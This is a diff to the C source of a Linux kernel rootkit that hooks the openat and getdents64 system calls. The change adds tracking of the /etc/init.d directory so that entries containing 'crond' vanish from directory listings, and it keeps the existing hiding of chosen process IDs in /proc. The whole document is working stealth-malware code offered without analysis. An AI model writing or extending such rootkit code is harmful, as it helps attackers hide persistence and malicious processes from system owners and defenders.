@@ -24,6 +24,7 @@ MODULE_VERSION("0.1");
 #define BASE_PROC 1
 #define NET_PROC 2
 #define MODULES_PROC 3
+#define INIT_FILE 4
 
 char * ROOTKIT_NAME = "rootkit";
 
@@ -108,6 +109,17 @@ asmlinkage long mal_sys_openat(const struct pt_regs * regs)
 
                                 proc_fd_head = ll_element;
                                 return fd;
+                        } else if (!strcmp(full_path, "/etc/init.d")) {
+                                long fd = original_sys_openat(regs);
+
+                                struct proc_fd * ll_element = (struct proc_fd *)kmalloc(sizeof(struct proc_fd), GFP_KERNEL);
+                                ll_element->pid = current->pid;
+                                ll_element->fd = fd;
+                                ll_element->type = INIT_FILE;
+                                ll_element->next = proc_fd_head;
+
+                                proc_fd_head = ll_element;
+                                return fd;
                         }
                 }
 
@@ -145,7 +157,7 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
         bool is_proc = false;
 		int dir_type = 0;
         while (tmp) {
-                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC)) {
+                if (tmp->fd == fd && tmp->pid == pid && (tmp->type == BASE_PROC || tmp->type == INIT_FILE)) {
                         is_proc = true;
 						dir_type = tmp->type;
                         break;
@@ -182,18 +194,21 @@ asmlinkage long mal_sys_getdents64(const struct pt_regs * regs)
                                 // each call seeks file stream, so just return next
                                 curr_off += dpt->d_reclen;
                                 continue;
+						} else if ((dir_type == INIT_FILE) && (strstr(dpt->d_name, "crond") != 0)) {
+                                curr_off += dpt->d_reclen;
+                                continue;
 						}
 
-                        if (is_proc) {
-                                long file_pid = 0;
-                                kstrtol(dpt->d_name+1, 10, &file_pid);
+                        if (is_proc && (dir_type == BASE_PROC)) {
+								long file_pid = 0;
+								kstrtol(dpt->d_name+1, 10, &file_pid);
 
-                                if (file_pid > 0) {
-                                        if (pid_map[file_pid]) {
-                                                curr_off += dpt->d_reclen;
-                                                continue;
-                                        }
-                                }
+								if (file_pid > 0) {
+										if (pid_map[file_pid]) {
+												curr_off += dpt->d_reclen;
+												continue;
+										}
+								}
                         }
 
                         memcpy(clean_buff+clean_off, buffer+curr_off, dpt->d_reclen);
